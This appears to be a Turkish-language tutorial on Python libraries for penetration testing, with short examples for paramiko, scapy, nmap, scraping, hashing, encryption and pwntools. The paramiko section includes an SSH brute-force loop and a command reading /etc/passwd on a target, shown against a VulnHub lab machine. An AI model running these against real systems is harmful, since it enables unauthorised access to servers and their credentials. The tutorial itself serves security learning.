COMMAND = "komut"
```

```
ssh = paramiko.SSHClient()  # SSH nesnesi oluşturma  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```

```
ssh.connect(ip, username, password) # SSH bağlantısını kurma  
stdin, stdout, stderr = ssh.exec_command(command) # Komut çalıştırma  
print(stdout.read())
```

```
ssh.close()
```

Bu örnekte pramaiko modülü ile bir SSH client'ı oluşturduk. Uygulama belirtilen ip ve port adresine kullanıcı adı ve parola bilgileri ile bir bağlantı gerçekleştirir ve 'whoami' komutunu çalıştırır. Ardından dönen cevabı ekrana yazdırır ve SSH bağlantısını kapatır.


Bu örnekte, sanal ortamda [Typhoon](https://www.vulnhub.com/entry/typhoon-102,267/) makinesini çalıştırarak SSH ile bağlandık. Şimdi bu modül ile daha neler yapabileceğimize bir bakalım.

### SSH brute force saldırısı

Paramiko ile SSH bağlantısı yapabilediğimize göre bir kabaa kuvvet saldırısı da yapabiliriz. Bunun için bir kullanıcı adı listesi bir de parola listesi oluşturacağız. Ardından bu listedeki bilgiler ile SSH bağlantısı kurmaya çalışacağız.

```
import paramiko
```

```
ssh = paramiko.SSHClient()  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
username_list = []  
password_list = []
```

```
for i in username_list:  
    for j in password_list:  
        try:  
            ssh.connect(ip,username=i, password=j)  
            print(i,j)  
            ssh.close()  
        except:  
            pass
```

Yukarıdaki kodda saldırı için bir kullanıcı adı listesi bir de parola listesi gerekmektedir, bunları koddaki listelere ekleyebilirsiniz. Hedef ip adresi de ssh.connect() fonskiyonuna verilmelidir. Ardından kod çalıştırıldığında, ilgili ip adresine kullanıcı adı ve parola listelerindeki değerler teker teker denenir. Bu işlemde hedef sunucuda SSH servisinin açık olduğundan emin olun. Aksi takdirde, işlem başarısız olacaktır.

### Passwd dosyasını çekme

SSH bağlantısını sağladığımız taktirde, hedef sunucudan aldığımız shell ile istediğimiz işlemi yapabiliriz. Bunun için *ssh.exec\_command()* metodunu kullanırız.

```
import paramiko
```

```
ssh = paramiko.SSHClient()  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
ssh.connect(ip, username, password)  
stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd")  
print(stdout.read().decode('ascii'))
```

Yukarıdaki kod ile hedef sunucunun *passwd* dosyasını okuyup ekrana yazdırdık.

### Son

Sonuç olarak, paramiko modülü ile uzak sunuculara SSH bağlantısı yaptık ve sunucular üzerinde komut çalıştırdık. Paramiko ile başka ne tür uygulamalar yapılabilir yorumlara beklerim”¦

## scapy

### Giriş
Scapy, ağ paketlerini göndermek, koklamak (sniffing), analiz etmek ve manipüle etmek için kullanılan güçlü bir interaktif paket manipülasyon kütüphanesidir. Geleneksel araçların (ping, traceroute, nmap, tcpdump vb.) yaptığı işlerin çoğunu kendi özel scriptlerinizle yapabilmenizi sağlar.

### Kurulum
Scapy'yi sisteminize kurmak için aşağıdaki komutu kullanabilirsiniz:
```
pip install scapy
```

### Temel Kullanım
Aşağıdaki örnekte, Scapy kullanarak basit bir ICMP (Ping) paketi oluşturup gönderiyoruz ve gelen yanıtı yazdırıyoruz:

```python
from scapy.all import IP, ICMP, sr1

# IP ve ICMP katmanlarını birleştirerek paket oluşturma
packet = IP(dst="8.8.8.8")/ICMP()

# Paketi gönder ve ilk gelen yanıtı bekle
response = sr1(packet, timeout=2)

if response:
    response.show()
else:
    print("Yanıt alınamadı.")
```

## python-nmap

### Giriş
python-nmap, popüler port tarayıcı ve ağ keşif aracı Nmap'i Python scriptleri içerisinden kontrol etmenizi sağlar. Tarama sonuçlarını otomatikleştirerek raporlama veya diğer otomasyon süreçlerinde kullanmak için idealdir.

### Kurulum
Bu kütüphaneyi kullanmak için sisteminizde Nmap'in kurulu olması gerekir. Kütüphaneyi kurmak için:
```
pip install python-nmap
```

### Temel Kullanım
Belirli bir hedef üzerinde hızlı bir port taraması gerçekleştirmek ve sonuçları almak için aşağıdaki kodu kullanabiliriz:

```python
import nmap

# Nmap tarayıcı nesnesi oluşturma
nm = nmap.PortScanner()

# Hedefi tara (22 ila 80. portlar arası)
nm.scan('127.0.0.1', '22-80')

# Sonuçları ekrana yazdır
for host in nm.all_hosts():
    print(f"Host: {host} ({nm[host].hostname()})")
    print(f"Durum: {nm[host].state()}")
    for proto in nm[host].all_protocols():
        print(f"Protokol: {proto}")
        ports = nm[host][proto].keys()
        for port in ports:
            print(f"Port: {port}\tDurum: {nm[host][proto][port]['state']}")
```

## beautifulsoup4

### Giriş
BeautifulSoup, HTML ve XML dökümanlarını ayrıştırmak (parse etmek) için kullanılan popüler bir web kazıma (web scraping) kütüphanesidir. Karışık HTML yapıları içerisinden belirli etiketleri, sınıfları veya id'leri kolayca ayıklamayı sağlar.

### Kurulum
BeautifulSoup4 modülünü kurmak için:
```
pip install beautifulsoup4
```

### Temel Kullanım
Aşağıdaki örnekte, requests ile bir web sayfasını çekip BeautifulSoup ile içerisindeki tüm linkleri (a etiketlerini) listeliyoruz:

```python
import requests
from bs4 import BeautifulSoup

url = "https://example.com"
response = requests.get(url)

# HTML içeriğini ayrıştırma
soup = BeautifulSoup(response.text, 'html.parser')

# Tüm 'a' (bağlantı) etiketlerini bulma
for link in soup.find_all('a'):
    print(link.get('href'))
```

## playwright

### Giriş
Playwright, modern web sitelerinde tarayıcı otomasyonu ve testleri gerçekleştirmek için geliştirilmiş güçlü bir kütüphanedir. Chromium, Firefox ve WebKit tarayıcılarını headless (arayüzsüz) veya normal modda kontrol etmenizi sağlar.

### Kurulum
Playwright modülünü kurup gerekli tarayıcıları indirmek için:
```
pip install playwright
playwright install
```

### Temel Kullanım
Aşağıdaki kod, Playwright kullanarak arka planda bir tarayıcı açıp belirtilen web sayfasının ekran görüntüsünü kaydeder:

```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    # Tarayıcıyı başlat (headless modda)
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    
    # Hedef sayfaya git
    page.goto("https://example.com")
    
    # Ekran görüntüsü al
    page.screenshot(path="screenshot.png")
    print("Ekran görüntüsü 'screenshot.png' olarak kaydedildi.")
    
    browser.close()
```

## hashlib

### Giriş
hashlib, Python'un yerleşik (built-in) kriptografik hash fonksiyonlarını barındıran modülüdür. Verilerin bütünlüğünü doğrulamak, parolaları güvenli bir şekilde saklamak veya hash kırma algoritmaları yazmak için MD5, SHA-1, SHA-256 gibi algoritmaları destekler.

### Kurulum
Yerleşik bir modül olduğu için ek bir kuruluma gerek yoktur. Doğrudan `import hashlib` yazarak kullanabilirsiniz.

### Temel Kullanım
Bir metnin SHA-256 hash değerini hesaplamak için aşağıdaki yapıyı kullanabilirsiniz:

```python
import hashlib

data = "guvenli_parola"

# SHA-256 hash nesnesi oluşturma ve veriyi kodlama
hash_object = hashlib.sha256(data.encode())

# Hexadecimal formatında hash değerini alma
hex_dig = hash_object.hexdigest()

print("SHA-256 Hash:", hex_dig)
```

## cryptography

### Giriş
cryptography, modern simetrik (AES gibi) ve asimetrik (RSA gibi) şifreleme yöntemlerini içeren kapsamlı bir kütüphanedir. Güvenli veri iletimi ve şifreleme işlemleri yapmak için standart kütüphanelerin başında gelir.

### Kurulum
Kütüphaneyi kurmak için:
```
pip install cryptography
```

### Temel Kullanım
Aşağıdaki örnekte Fernet (simetrik şifreleme) kullanarak bir veriyi şifreliyor ve ardından şifreyi çözüyoruz:

```python
from cryptography.fernet import Fernet

# Şifreleme anahtarı oluşturma
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Şifrelenecek veri
message = b"Gizli veri buradadir."

# Şifreleme
cipher_text = cipher_suite.encrypt(message)
print("Şifreli veri:", cipher_text)

# Şifre çözme
plain_text = cipher_suite.decrypt(cipher_text)
print("Orijinal veri:", plain_text.decode())
```

## os ve sys

### Giriş
os ve sys, Python'un yerleşik işletim sistemi ve sistem parametreleri ile etkileşime giren temel modülleridir. Dosya işlemleri, çevre değişkenleri, komut satırı argümanları ve çalışma ortamını yönetmek için kullanılırlar.

### Kurulum
Yerleşik (built-in) modüller oldukları için kuruluma ihtiyaç duymazlar.

### Temel Kullanım
Komut satırından parametre almayı ve güncel çalışma dizinini öğrenmeyi gösteren basit bir script:

```python
import os
import sys

# Güncel çalışma dizinini yazdırma
current_dir = os.getcwd()
print("Çalışma dizini:", current_dir)

# Komut satırı argümanlarını kontrol etme
if len(sys.argv) > 1:
    print("Verilen argümanlar:", sys.argv[1:])
else:
    print("Herhangi bir argüman verilmedi.")
```

## subprocess

### Giriş
subprocess modülü, Python scriptleri içerisinden yeni süreçler (process) başlatmanıza, işletim sistemine ait yerel komutları çalıştırmanıza ve bunların girdi/çıktı/hata akışlarını yönetmenize olanak tanır.

### Kurulum
Yerleşik (built-in) bir modüldür, kuruluma gerek yoktur.

### Temel Kullanım
Aşağıdaki örnekte, sistemde "ping" komutunu çalıştırıp çıktısını yakalıyor ve ekrana yazdırıyoruz:

```python
import subprocess

# Sistem komutunu çalıştırma ve çıktıyı yakalama
# Windows için ping parametresi -n, Linux için -c'dir.
result = subprocess.run(["ping", "-n", "1", "8.8.8.8"], capture_output=True, text=True)

# Komut çıktısını ekrana yazdır
print("Çıkış Kodu:", result.returncode)
print("Çıktı:\n", result.stdout)
```

## ctypes

### Giriş
ctypes, Python için bir dış fonksiyon kütüphanesidir. Doğrudan C dilinde yazılmış dinamik kütüphaneleri (Windows'ta DLL, Linux'ta .so dosyalarını) belleğe yüklemeyi ve C veri tiplerini kullanmayı sağlar. Sistem API'leri ile doğrudan konuşmak için kullanılır.

### Kurulum
Yerleşik (built-in) bir modüldür, kuruluma gerek yoktur.

### Temel Kullanım
Windows işletim sisteminde ctypes kullanarak basit bir bilgi mesaj kutusun (MessageBox) gösteren örnek:

```python
import ctypes

# Windows API'sini (User32.dll) çağırma
# Not: Bu kod Windows sistemlerde çalışır.
try:
    user32 = ctypes.windll.user32
    user32.MessageBoxW(0, "ctypes ile Windows API çağrısı yapıldı!", "Bilgi", 1)
except AttributeError:
    print("Bu kod sadece Windows işletim sistemlerinde çalışır.")
```

## pwntools

### Giriş
Pwntools, exploit yazımını, ağ bağlantılarını (sockets), ELF dosyalarının analizini ve yerel/uzak süreç manipülasyonunu kolaylaştırmak için geliştirilmiş, CTF (Capture The Flag) yarışmacıları ve exploit geliştiricileri için standart haline gelmiş bir CTF framework'üdür.

### Kurulum
Pwntools'u kurmak için:
```
pip install pwntools
```

### Temel Kullanım
Yerel bir süreçle veya uzak bir portla etkileşim kurmak, veri gönderip almak için pwntools kullanımı:

```python
from pwn import *

# Yerel bir süreci başlatma (örneğin /bin/sh)
# r = process('/bin/sh')

# Veya uzak bir sunucuya bağlanma
# r = remote('example.com', 1337)

# Basit bir hex/string dönüşümü ve paketleme örneği
payload = p32(0xdeadbeef) # 32-bit little endian paketleme
print("Paketlenmiş payload:", payload)

# cyclic yapısı ile taşma boyutunu tespit etme
print("Cyclic pattern (16):", cyclic(16))
```


Python, siber güvenlik dünyasında (hem ofansif yani saldırı, hem de defansif yani savunma tarafında) en çok tercih edilen dillerden biridir. Bir hackerın ya da siber güvenlik uzmanının Python kullanırken işini kolaylaştıran, hazır fonksiyonlar sunan birçok modül ve kütüphane bulunur.

Bu modülleri kullanım amaçlarına göre kategorize ederek inceleyebiliriz. Aşağıdaki interaktif diyagramda kategorileri ve içerdikleri modülleri görebilir, ilgilendiğiniz modülün üzerine tıklayarak doğrudan detaylı anlatımına gidebilirsiniz:

## Modül Haritası

```mermaid
flowchart TD
    %% Styling and config
    classDef category fill:#1e1e2e,stroke:#cba6f7,stroke-width:2px,color:#cdd6f4;
    classDef module fill:#313244,stroke:#89b4fa,stroke-width:1px,color:#cdd6f4;
    
    Start[Python Siber Güvenlik Ekosistemi] --> Cat1[1. Ağ ve Paket]
    Start --> Cat2[2. Web Sızma Testleri]
    Start --> Cat3[3. Kriptografi ve Parola]
    Start --> Cat4[4. Sistem ve OS]
    Start --> Cat5[5. Exploit Geliştirme]

    Cat1 --> M1_1[scapy]
    Cat1 --> M1_2[socket]
    Cat1 --> M1_3[python-nmap]

    Cat2 --> M2_1[requests]
    Cat2 --> M2_2[selenium]
    Cat2 --> M2_3[beautifulsoup4]
    Cat2 --> M2_4[playwright]

    Cat3 --> M3_1[hashlib]
    Cat3 --> M3_2[cryptography]
    Cat3 --> M3_3[paramiko]

    Cat4 --> M4_1[os ve sys]
    Cat4 --> M4_2[subprocess]
    Cat4 --> M4_3[ctypes]

    Cat5 --> M5_1[pwntools]

    class Cat1,Cat2,Cat3,Cat4,Cat5 category;
    class M1_1,M1_2,M1_3,M2_1,M2_2,M2_3,M2_4,M3_1,M3_2,M3_3,M4_1,M4_2,M4_3,M5_1 module;
    style Start fill:#f38ba8,stroke:#f38ba8,stroke-width:2px,color:#11111b;

    click M1_1 href "#scapy" "Scapy modülüne git"
    click M1_2 href "#socket" "Socket modülüne git"
    click M1_3 href "#python-nmap" "Python-Nmap modülüne git"
    click M2_1 href "#requests" "Requests modülüne git"
    click M2_2 href "#selenium" "Selenium modülüne git"
    click M2_3 href "#beautifulsoup4" "BeautifulSoup4 modülüne git"
    click M2_4 href "#playwright" "Playwright modülüne git"
    click M3_1 href "#hashlib" "Hashlib modülüne git"
    click M3_2 href "#cryptography" "Cryptography modülüne git"
    click M3_3 href "#paramiko" "Paramiko modülüne git"
    click M4_1 href "#os-ve-sys" "OS ve Sys modüllerine git"
    click M4_2 href "#subprocess" "Subprocess modülüne git"
    click M4_3 href "#ctypes" "Ctypes modülüne git"
    click M5_1 href "#pwntools" "Pwntools modülüne git"
```


---

> ⚠️ **Önemli Not:** Bu modüllerin siber güvenlik testlerinde (Sızma Testleri) ve eğitim amaçlı laboratuvar ortamlarında kullanımı tamamen yasaldır. Ancak, yetkiniz olmayan sistemlere karşı bu araçlarla tarama veya saldırı yapmak yasal suç teşkil eder.